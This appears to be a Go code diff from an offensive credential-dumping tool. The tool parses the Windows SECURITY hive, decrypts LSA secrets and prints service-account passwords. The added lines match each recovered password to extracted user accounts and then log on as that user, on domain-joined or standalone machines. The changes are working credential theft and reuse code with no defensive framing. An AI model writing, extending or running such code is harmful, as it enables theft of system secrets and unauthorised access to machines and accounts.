@@ -39,8 +39,6 @@ func parseSECURITY(data []byte, bootKey []byte, domainName string, isDomainJoine
 
 	for _, secretKey := range subkeys {
 		secretName := secretKey.Name
-		fmt.Printf("\n[+] processing secret: %s\n", secretName)
-
 		currValKey, err := hive.FindKey("Policy\\Secrets\\" + secretName + "\\CurrVal")
 		if err != nil {
 			fmt.Printf("    [!] failed to find CurrVal key: %v\n", err)
@@ -63,7 +61,6 @@ func parseSECURITY(data []byte, bootKey []byte, domainName string, isDomainJoine
 
 		secretData := decryptLSASecret(encryptedSecret, lsaKey)
 		if secretData == nil || len(secretData) == 0 {
-			fmt.Printf("    [!] decryption failed or result too small\n")
 			continue
 		}
 
@@ -158,6 +155,33 @@ func displaySecret(name string, data []byte, domainName string, isDomainJoined b
 			password := utf16ToString(data)
 			if password != "" {
 				fmt.Printf("    password: %s\n", password)
+				var matchedCredential *UserCredential
+				if extractedCredentials != nil {
+
+					for _, credential := range extractedCredentials {
+						username := strings.ToLower(credential.Username)
+						service := strings.ToLower(serviceName)
+						if username == service ||
+							strings.Contains(service, username) ||
+							strings.Contains(username, service) {
+							matchedCredential = credential
+							break
+						}
+					}
+
+					if matchedCredential != nil {
+						matchedCredential.Password = password
+						fmt.Printf("    matched user: %s\n\n", matchedCredential.Username)
+						if isDomainJoined {
+							logonUserDomainJoined(matchedCredential.Username, password, domainName)
+						} else {
+							logonUserNonDomainJoined(matchedCredential.Username, password)
+						}
+					} else {
+						fmt.Printf("    no matching user found for service: %s\n", serviceName)
+					}
+				}
+
 				if isDomainJoined {
 					fmt.Printf("    domain: %s (domain-joined)\n", domainName)
 				} else {
